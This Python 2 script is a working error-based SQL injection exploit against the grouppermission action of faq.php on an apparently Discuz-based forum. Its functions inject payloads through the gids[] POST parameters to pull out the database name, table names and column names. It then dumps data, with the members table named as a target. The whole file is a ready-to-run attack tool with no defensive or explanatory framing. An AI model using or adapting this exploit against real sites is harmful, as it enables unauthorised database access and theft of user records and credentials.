import requests
import re
import copy
from optparse import OptionParser
url_template = "http://192.168.1.180/dz/faq.php?action=grouppermission"
pattern = re.compile("Duplicate entry '(.*)1'")

opt = OptionParser()
opt.add_option("--tables", dest="tables", type=str, help="get tables_name")
opt.add_option("-T", dest="table", type=str, help="enter table name")
opt.add_option("-C", dest="column", type=str, help="enter columns name")
(options, args) = opt.parse_args()

def get_database():
    print "get database name >>>"
    payload = {"gids[99]":"'","gids[100][0]":") and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)#"}
    res = requests.post(url_template,data=payload)
    result = pattern.search(res.content)
    print result.group(1)

def get_table():
    print "get Table name>>"
    payload = {"gids[99]":"'123","gids[100][0]":") and (select 1 from (select count(*),concat((select  table_name from information_schema.tables where table_schema=database() LIMIT {0},1),floor(rand(0)*2))x from information_schema.tables group by x)a)#"}
    for i in range(0,200):
        data = copy.copy(payload)
        data["gids[100][0]"] = payload["gids[100][0]"].format(i)
        response = requests.post(url_template, data=data)
        html = response.content
        result = pattern.search(html)
        if result:
            print result.group(1)
        else:
            break
def get_columns_name(table):
    '''cdb_members 0x6364625f6d656d62657273
    '''
    print "get table name>>>"
    table_name = '0x'+table.encode('hex')
    print "columns_name>>>"
    payload = {"gids[99]":"'","gids[100][0]":") and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name={0} LIMIT {1},1),floor(rand(0)*2))x from information_schema.tables group by x)a)#"}
    for i in range(0, 200):
        data = copy.copy(payload)
        data["gids[100][0]"] = payload["gids[100][0]"].format(table_name, i)
#        print data["gids[100][0]"]
        response = requests.post(url_template, data=data)
        html = response.content
        result = pattern.search(html)
        if result:
            print result.group(1)
        else:
            break

def get_data(column,table):
    payload = {"gids[99]":"'","gids[100][0]":") and (select 1 from (select count(*),concat((select {0} from {1} limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)#"}
    for i in range(0, 200):
        data = copy.copy(payload)
        data["gids[100][0]"] = payload["gids[100][0]"].format(column, table)
#        print data["gids[100][0]"]
        response = requests.post(url_template, data=data)
        html = response.content
        result = pattern.search(html)
        if result:
            print result.group(1)
            break
def main():
    if options.tables:
        get_table()
    if options.table:
        get_columns_name(options.table)
    if options.column:
        get_data(options.column,options.table)

if __name__=="__main__":
    main()


